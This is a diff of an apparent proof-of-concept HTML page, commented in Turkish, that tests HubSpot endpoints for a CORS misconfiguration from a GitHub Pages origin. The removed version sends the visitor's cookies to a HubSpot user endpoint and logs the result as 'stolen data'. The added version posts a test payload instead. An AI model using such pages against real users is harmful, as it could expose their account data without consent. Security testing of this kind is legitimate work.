@@ -1,43 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HubSpot CORS Test</title>
+    <title>HubSpot CORS PoC</title>
     <style>
-        body { font-family: Arial; padding: 20px; }
-        pre { background: #f0f0f0; padding: 10px; }
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        button { background: #4285f4; color: white; border: none; padding: 10px 20px; cursor: pointer; }
+        pre { background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
-    <h1>HubSpot CORS Exploit PoC</h1>
-    <button id="testBtn">VERİYİ ÇEK</button>
-    <pre id="result"></pre>
+    <h1>HubSpot CORS Test PoC</h1>
+    <p>Bu buton HubSpot API'sine istek gönderir:</p>
+    
+    <button id="testBtn">TEST ET</button>
+    
+    <div id="resultContainer">
+        <h3>Sonuç:</h3>
+        <pre id="result">Sonuç burada görünecek...</pre>
+    </div>
 
     <script>
-        document.getElementById("testBtn").addEventListener("click", () => {
+        document.getElementById("testBtn").addEventListener("click", function() {
             const resultEl = document.getElementById("result");
-            resultEl.textContent = "İstek gönderiliyor...";
-
-            // HASSAS VERİ ÇEKEN API
-            fetch("https://exceptions-eu1.hubspot.com/api/v3/users/me", {
-                method: "GET",
-                credentials: "include",  // Çerezleri gönder
+            resultEl.innerHTML = "İstek gönderiliyor...";
+            
+            // HubSpot API Endpoint (Sizin verdiğiniz URL)
+            const url = "https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui";
+            
+            fetch(url, {
+                method: "POST",
                 headers: {
-                    "Origin": "https://vukuff.github.io",  // GitHub Pages origin'iniz
-                    "Accept": "application/json"
-                }
+                    "Content-Type": "text/plain",
+                    "Origin": "https://vukuff.github.io"  // GitHub Pages origininiz
+                },
+                body: JSON.stringify({
+                    test: "CORS PoC from GitHub Pages"
+                })
             })
-            .then(res => {
-                resultEl.innerHTML = `STATUS: ${res.status}\nCORS HEADER: ${res.headers.get("Access-Control-Allow-Origin")}`;
-                return res.json();
+            .then(response => {
+                // HTTP Durumunu ve CORS başlıklarını göster
+                const corsHeader = response.headers.get("Access-Control-Allow-Origin");
+                resultEl.innerHTML = `
+                    <span class="success">✔ İstek Başarılı!</span><br>
+                    <b>Status:</b> ${response.status} ${response.statusText}<br>
+                    <b>CORS Header:</b> ${corsHeader}<br>
+                    <b>Credentials Allowed:</b> ${response.headers.get("Access-Control-Allow-Credentials")}
+                `;
+                return response.text();
             })
             .then(data => {
-                console.log("ÇALINAN VERİ:", data);  // Konsola yaz
-                resultEl.textContent += `\n\nVERİ:\n${JSON.stringify(data, null, 2)}`;
+                // Ham yanıtı göster
+                resultEl.innerHTML += `<br><br><b>Response Data:</b><br>${data}`;
+                console.log("Tam yanıt:", data);
             })
-            .catch(err => {
-                resultEl.textContent = "HATA: " + err.message;
+            .catch(error => {
+                resultEl.innerHTML = `<span class="error">✘ Hata: ${error.message}</span>`;
             });
         });
     </script>
+    
+    <p><small>GitHub Repo: <a href="https://github.com/vukuff/Cors-poc" target="_blank">vukuff/Cors-poc</a></small></p>
 </body>
 </html>
